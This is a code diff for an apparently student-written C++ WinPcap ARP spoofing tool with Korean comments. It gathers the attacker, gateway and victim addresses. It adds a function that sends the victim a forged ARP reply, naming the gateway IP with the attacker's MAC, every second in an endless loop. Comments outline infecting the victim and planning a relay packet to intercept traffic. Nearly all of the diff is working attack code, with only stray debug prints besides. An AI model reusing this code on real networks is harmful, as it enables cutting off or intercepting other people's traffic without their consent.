@@ -150,23 +150,34 @@ int Winpcap_Packet_System::open_device(pcap_t *_adhandle, int _flag)
 			}
 		}
 
-		while (Adapter_addr->FirstUnicastAddress != NULL)
+		//게이트웨어 ip획득
+		if (Adapter_addr->FirstUnicastAddress != NULL)
 		{
-			sockaddr_in *sa_in = (sockaddr_in *)Adapter_addr->FirstUnicastAddress->Address.lpSockaddr;
-			
-			if (sa_in->sin_family == AF_INET)
+			for (i = 0; Adapter_addr->FirstUnicastAddress != NULL; i++)
 			{
-				for (int i = 0; i < 4; i++)
+				if (Adapter_addr->FirstUnicastAddress->Address.lpSockaddr->sa_family == AF_INET)
 				{
-					Basic_addr.attacker_ip.push_back(Adapter_addr->FirstUnicastAddress->Address.lpSockaddr->sa_data[i + 2]); // 공격자의 IP 설정
-					Basic_addr.gate_ip.push_back(Gate_addr->Address.lpSockaddr->sa_data[i + 2]); // 게이트 IP 설정
+					Basic_addr.gate_ip.push_back(Gate_addr->Address.lpSockaddr->sa_data[2]);
+					Basic_addr.gate_ip.push_back(Gate_addr->Address.lpSockaddr->sa_data[3]);
+					Basic_addr.gate_ip.push_back(Gate_addr->Address.lpSockaddr->sa_data[4]);
+					Basic_addr.gate_ip.push_back(Gate_addr->Address.lpSockaddr->sa_data[5]);
+
+
+					// 공격자의 ip 획득
+					sockaddr_in *sa_in = (sockaddr_in *)Adapter_addr->FirstUnicastAddress->Address.lpSockaddr;
+					Basic_addr.attacker_ip.push_back(sa_in->sin_addr.S_un.S_un_b.s_b1);
+					Basic_addr.attacker_ip.push_back(sa_in->sin_addr.S_un.S_un_b.s_b2);
+					Basic_addr.attacker_ip.push_back(sa_in->sin_addr.S_un.S_un_b.s_b3);
+					Basic_addr.attacker_ip.push_back(sa_in->sin_addr.S_un.S_un_b.s_b4);
+
+					break;
 				}
-				break;
+
+				Adapter_addr->FirstUnicastAddress = Adapter_addr->FirstUnicastAddress->Next;
+
 			}
 
-			Adapter_addr->FirstUnicastAddress = Adapter_addr->FirstUnicastAddress->Next;
 		}
-
 
 		// 희생자 IP 설정
 		Input_Victim_ip();
@@ -179,10 +190,11 @@ int Winpcap_Packet_System::open_device(pcap_t *_adhandle, int _flag)
 
 		Basic_addr.gate_mac = Send_ARP_For_Macaddr(adhandle, GET_GATEMAC_MODE);
 		Basic_addr.victim_mac = Send_ARP_For_Macaddr(adhandle, GET_VICTIMEMAC_MODE);
+		cout << " 으에ㅔㄱ게게" << endl;
 
 		// 구해온 게이트 웨이 정보로 ARP SPOOFING 에 필요한 자료를 수집한다.
 	}
-	cout << " 으엑 " << endl;
+	
 	pcap_freealldevs(alldevs);
 
 
@@ -423,7 +435,7 @@ vector<u_char> Winpcap_Packet_System::Send_ARP_For_Macaddr(pcap_t* _handle, int 
 		infec->etc.ether_dhost[i] = 0xFF;
 		infec->etc.ether_shost[i] = Basic_addr.attacker_mac[i];
 		infec->arp.source_Macaddr[i] = Basic_addr.attacker_mac[i];
-		infec->arp.Des_Macaddr[i] = 0;
+		infec->arp.Des_Macaddr[i] = 0xFF;
 		
 	}
 	infec->etc.ether_type = htons(ETHERTYPE_ARP);
@@ -460,7 +472,6 @@ vector<u_char> Winpcap_Packet_System::Send_ARP_For_Macaddr(pcap_t* _handle, int 
 	struct pcap_pkthdr *header;
 	const u_char *pkt_data;
 
-	
 	infection* Recieve_arp;
 
 	while ((res = pcap_next_ex(_handle, &header, &pkt_data)) >= 0) 
@@ -488,7 +499,7 @@ vector<u_char> Winpcap_Packet_System::Send_ARP_For_Macaddr(pcap_t* _handle, int 
 		{
 			for (int i = 0; i < 6; i++)
 			{
-				get_mac.push_back(pkt_data[i + 6]);
+				get_mac.push_back(Recieve_arp->arp.source_Macaddr[i]);
 			}
 			break;
 		}
@@ -496,6 +507,50 @@ vector<u_char> Winpcap_Packet_System::Send_ARP_For_Macaddr(pcap_t* _handle, int 
 
 
 	return get_mac;
+}
+
+void Winpcap_Packet_System::Send_Arp_Infection_Packet()
+{
+	infection *infection_packet = new infection;
+
+	for (int i = 0; i < 6; i++)
+	{
+		infection_packet->etc.ether_dhost[i] = Basic_addr.victim_mac[i];
+		infection_packet->etc.ether_shost[i] = Basic_addr.attacker_mac[i];
+		infection_packet->arp.source_Macaddr[i] = Basic_addr.attacker_mac[i];
+		infection_packet->arp.Des_Macaddr[i] = Basic_addr.victim_mac[i];
+	}
+
+	for (int i = 0; i < 4; i++)
+	{
+		infection_packet->arp.source_ipaddr[i] = Basic_addr.gate_ip[i];
+		infection_packet->arp.Des_ipaddr[i] = Basic_addr.victim_ip[i];
+	}
+	
+	infection_packet->etc.ether_type = htons(ETHERTYPE_ARP);
+
+	infection_packet->arp.hard_type = htons(0x1);
+	infection_packet->arp.Pro_type = htons(0x0800);
+	infection_packet->arp.hard_length = 6;
+	infection_packet->arp.pro_length = 4;
+	infection_packet->arp.op_code = htons(0x02);  // reply
+		
+	u_char *temp = (u_char*)infection_packet;
+
+	while (1)
+	{
+		if (pcap_sendpacket(adhandle, temp, 42) != 0)
+		{
+			fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
+			return;
+		}
+		for (int i = 0; i < 42; i++)
+			printf("%X ", temp[i]);
+
+		cout << " send " << endl;
+		Sleep(1000);
+	}
+
 }
 
 
@@ -524,30 +579,31 @@ void Winpcap_Packet_System::_RunArpSpoofing()
 
 	else
 	{
-		Basic_addr;
 
-		
+		cout << "떼엑";
+		Send_Arp_Infection_Packet();
 		// Victim 정보획득
 		// 상대방 ip만 알아도 모든 정보를 불러올 수 있도록 자동화해야 한다.
 		// 1. GateWay IP 와 GateWay Mac 을 알아야 된다.
 		// 2. 공격자 자신의 Mac과 공격자 자신의 ip 를 알아야 한다.
 		// 3. 상대방 IP 주소를 알면 상대방 MAC 주소도 알수 있다.
 
-
-		// -> open_device 에서 처리를해줌
+		// -> open_device 에서 처리를해줌 플래그 값 1로 줘야함.
 
 		// Arp Infection 패킷을 만들어야 한다.(source 나 , destination 공유기)
 		// 1. 감염 패킷은 ARP HEADER와 ETERNET 헤더를 합친것이다.
 		// 2. 감염 성공시 arp -a 명령어를 통해 확인할 수 있다. (인터넷도 끊긴다 )
 		// 3. 정보 획득으로 얻은 정보를 통해 나 자신(공격자)로 부터 희생자로부터 infection 패킷을 전송한다.
 
-		// ->
+		// -> void Send_Arp_Infection_Packet();
 
 		// Arp Relay 패킷을 만들어야 한다. ( source 공유기 destination 희생자 )
 		// 1. ARP_INFECTION 만 진행하면 나 자신도 희생자에 의해서 감염되기 때문에
 		//    게이트웨이와의 통신을 못해서 상대방 포함 나 자신도 감염되어 인터넷 연결이 안된다.
 		// 2. 인터넷 연결이 안되게 되면 ARP_Spoofing을 통해서 얻는 이득이 아무것도 없기 때문에
 		//	  나 자신과 통신하는게 아닌 공유기와 통신하는척 속여야 한다.
+
+		// -> void Make_Arp_Relay_Packet();
 
 
 
